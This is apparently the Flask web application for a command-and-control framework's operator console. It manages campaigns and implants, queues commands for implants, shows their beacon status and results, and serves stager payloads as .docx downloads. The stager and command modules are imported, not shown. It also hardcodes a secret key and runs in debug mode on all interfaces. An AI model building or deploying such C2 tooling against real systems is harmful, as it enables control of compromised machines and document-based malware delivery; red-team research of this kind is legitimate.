from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, session, send_file
from flask_sqlalchemy import SQLAlchemy
import base64
from Implant.Implant import ImplantSingleton
from flask_login import LoginManager, login_required, current_user, login_user, logout_user
from Data.Database import Database
from ServerApp.modules.UserManagement import UserManagementController
from ServerApp.modules.StagerGeneration import StagerGeneration
from ServerApp.modules import ImplantManagement
import time
#from wtforms import Form, TextField, TextAreaField, validators, StringField, SubmitField
# This is the web app to control implants and campaigns

db = Database()
Imp=ImplantSingleton.instance
UsrMgmt = UserManagementController()
ImpMgmt = ImplantManagement.ImplantManagement()
StagerGen = StagerGeneration(db)

app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
login = LoginManager(app)
login.init_app(app)
# -- Context Processors --#
@app.context_processor
def inject_dict_for_all_auth_templates():
    # -- Returns the list of Campaigns the auth'd user has read access to --#
    if current_user.is_authenticated:
        # Return the list of the users available campaigns for the navbar dropdown.
        return dict(campaignlist=db.Get_AllUserCampaigns(current_user.user_email))
    else:
        return dict()

@app.context_processor
def inject_dict_for_all_campaign_templates(cid=None):
    if 'cid' in g:
        cid =g.get('cid')
        cname=db.Get_CampaignNameFromCID(cid)
    if cid != None:
        return dict(campaign=cname, cid=cid)
    else:
        return dict()


# -- Managing the error and user object. -- #
# ----------------------------------------- #
@login.user_loader
def load_user(id):
    return db.Get_UserObject(id)
@app.before_request
def before_request():
    return
@app.after_request
def add_header(r):
    return r
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('BaseHomePage'),302) # This should be a proper 404?
@app.errorhandler(401)
def page_not_found(e):
    return redirect(url_for(('login')), 302)

# -- Authentication endpoints -- #
# ------------------------------ #

@app.route("/auth/login", methods=['GET','POST'])
def login():
    if request.method=="POST":
        if 'email' in request.form and 'password' in request.form and request.form['email'] != None and request.form['password'] != None:
            a = db.Get_UserObjectLogin(request.form['email'],request.form['password'])
            print(a, dir(a))
            if a == False:
                return render_template("auth/LoginPage.html", error="Incorrect Username/Password")
            if a.first_logon == 1:
                login_user(a)
                return redirect(url_for("BaseHomePage"))
            else:
                GUID = db.Get_UserFirstLogonGuid(request.form['email'])
                return render_template("auth/PasswordResetPage.html",guid=GUID)
    return render_template("auth/LoginPage.html")

@app.route("/auth/logout")
@login_required
def logout():
    if (current_user.is_authenticated):
        logout_user()
        return redirect(url_for("login"))
    else:
        return redirect(url_for("login"))

@app.route("/auth/passwordreset", methods = ['GET','POST'])
def PasswordReset():
    # -- TODO: Move to the UserManagement Class.
    if request.method =="POST":
        a = request
        print(request.form)
        pw_1=request.form['password_one']
        pw_2=request.form['password_two']
        pw_c=request.form['current_password']
        guid=request.form['id']
        if pw_1 == pw_2:
            UserObj = db.User_ChangePasswordOnFirstLogon(guid, pw_c,pw_1)
            if UserObj:
                login_user(UserObj)
                return redirect(url_for('BaseHomePage'))
    return redirect(url_for('login'))


# -- JSON Response for command responses and waiting commands -- #
# -------------------------------------------------------------- #

@app.route("/<cid>/cmd_response", methods =['GET','POST'])
@login_required
def cmdreturn(cid):
    # -- Javascript appears to not be printing out all entries
    if db.Verify_UserCanAccessCampaign(current_user.user_email,cid):
        return jsonify(Imp.Get_CommandResult(cid))
    else:
        return str(0)

@app.route("/<cid>/waiting_commands", methods=['GET','POST'])
@login_required
def waitingcommands(cid):
    # -- Get JSON blob which contains all implant commands and then registration state
    Commands = ImpMgmt.Get_RegisteredImplantCommands(current_user.user_email, cid)
    return jsonify(Commands)


# -- Main endpoints -- #
# -------------------- #

@app.route("/")
@login_required
def BaseHomePage():
    a = db.Get_AllUserCampaigns(current_user.user_email)
    return render_template("Homepage.html")

@app.route("/CreateCampaign", methods=['GET','POST'])
@login_required
def CreateNewItem():
    if request.method=="POST":
        if 'CreateCampaign' in request.form:
            print("Building Campaign")
            print(request.form)
            #print(dir())
            # WOrk out if Implant or Campaign
            db.Create_Campaign(request.form['title'],current_user.user_email,request.form['description'])
            return redirect(url_for('BaseHomePage'))
    else:
        return render_template('CreateCampaign.html')


# -- Non-Campaign Specific Pages -- #
# --------------------------------- #

@app.route("/settings",methods=['GET','POST'])
@login_required
def GlobalSettingsPage():
    if request.method == "POST":
        # -- Add user returns a dict with action/result/reason keys.
        Result = UsrMgmt.AddUser(request.form,current_user.user_email)
        print("Check form type and call respecitive function")
        return jsonify(Result)
    return  render_template("settings/GlobalSettings.html")


# -- CAMPAIGN SPECIFIC PAGES -- #
# ----------------------------- #

@app.route("/<cid>/")
@login_required
def BaseImplantPage(cid):
    g.setdefault('cid', cid)
    # -- This needs to return the implant_input.html template if any implants exist, if not reuturn ImplantMain
    # --    also need to work out the CID across the pages...
    Implants = db.Get_AllCampaignImplants(cid)
    if len(Implants) >0:
        return render_template("implant_input.html", Implants=Implants)
    return render_template("ImplantMain.html",cid=cid, Msg="No implants have called back in association with this campaign - create an implant base and use the stager page.")


@login_required
@app.route ("/<cid>/settings", methods=['GET','POST'])
def BaseImplantSettings(cid):
    # -- Gather Data for settings:
    # -- Users + read/write/none
    # -- Implant List
    g.setdefault('cid', cid)
    Users = db.Get_SettingsUsers(cid, current_user.user_email)
    if request.method == "POST":
        print(request.form)
        UsrMgmt.AddUserToCampaign(current_user.user_email, request.form, cid)
        return redirect(url_for('BaseImplantSettings', cid=cid))
    else:
        print(Users)
        return render_template("settings/CampaignSettings.html", users=Users)


@app.route("/<cid>/implant/create", methods=['GET','POST'])
@login_required
def NewImplant(cid):
    # -- set SID and user DB to convert --#
    g.setdefault('cid',cid)
    if request.method =="POST":
        result, result_text= ImpMgmt.CreateNewImplant(cid, request.form, current_user.user_email)
        if result==True:
            return render_template('CreateImplant.html', success=result_text)
        else:
            return render_template('CreateImplant.html', error=result_text)
    return render_template('CreateImplant.html')

# -- This may no longer be required -- #
@app.route("/<cid>/implant/generate", methods=["GET", "POST"])
@login_required
def ImplantGenerate():
    # -- Get iid from the POST request
    return "405"

@app.route("/<cid>/implant/cmd", methods=["GET","POST"])
@login_required
def ImplantCmdRegister(cid):
    # -- GET FORM --#
    # --    if ALL register on all implants wiht user write authority
    # --    if <iid> check user write authority
    # --     else RETURN 501 && log error.
    print(request.form)
    return "404"

@app.route("/<cid>/implant/stagers", methods=["GET","POST"])
@login_required
def ImplantStager(cid):
    g.setdefault('cid', cid)
    # -- get request: return list of implants --
    # -- Will update to a dropdown when exporting Word docs etc is possible -- #
    if request.method == "POST":
        if 'id' in request.args:
            try:
                if int(request.args['id']):
                    print("this is int")
            except:
                print("error")
        # TODO: Replace with content from webpage request.
        return send_file(StagerGen.GenerateSingleStagerFile(cid, current_user.user_email,"docx"), attachment_filename='file.docx')

    return render_template("ImplantStagerPage.html", implantList=StagerGen.GenerateStaticStagers(cid, current_user.user_email))

@app.route("/<cid>/implant/status", methods=['GET','POST'])
@login_required
def GetImplantStatus(cid):
    a = db.Get_AllCampaignImplants(cid)
    data = {}
    count = 1
    # TODO: Revise this section entirely.
    for x in a:
        b = x['beacon']
        a = time.time() - x['last_check_in']
        c = {"status": None, "title": x['generated_title'],"last_checked_in": x['last_check_in']}
        if a < b:
            c['status'] = "good"
        elif a < b * 2:
            c['status'] = "normal"
        else:
            c['status'] = "poor"
        data[count] = c
        count = count + 1
    return jsonify(data)

@app.route("/<cid>/graphs", methods=['GET','POST'])
@login_required
def CampaignGraph(cid):
    g.setdefault('cid', cid)
    # -- If we receive a POST request then we will populate the page, this will be called AFTER the page has loaded.
    if request.method=="POST":
        blah = {'a':"1",'b':"v"}
        return jsonify(blah)
    return render_template("CampaignGraph.html")

@app.route("/<cid>/logs", methods=["GET","POST"])
@login_required
def CampaignLogs(cid):
    g.setdefault('cid',cid)
    if request.method == "POST":
        # -- Replace with pre-organised campaign logs - simplifies JS component.
        # Get_CampaignLogs
        return jsonify(ImpMgmt.Get_CampaignLogs(current_user.user_email, cid))
        # Old method
        # return jsonify(ImpMgmt.Get_ChronologicallyOrderedCampaignLogsJSON(current_user.user_email,cid))
    return render_template("CampaignLogs.html")

# -- Implant command execution -- #
@app.route("/<cid>/implant/register_cmd", methods=["POST"])
@login_required
def ImplantCommandRegistration(cid):
    if request.method == "POST":
        print("\nCID: ",cid,"\nFRM: ",request.form)
        # -- This is the new format using ImpMgmt to handle validation of user and command.
        registration_response = ImpMgmt.ImplantCommandRegistration(cid, current_user.user_email, request.form)
        # -- Currently no return value is required. This should be defined.
        # print(registration_response)
        return jsonify(registration_response)

    return "000"
@app.route("/help",methods = ["GET"])
@login_required
def HelpPage():
    return render_template("HelpPage.html")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
    print ("App running")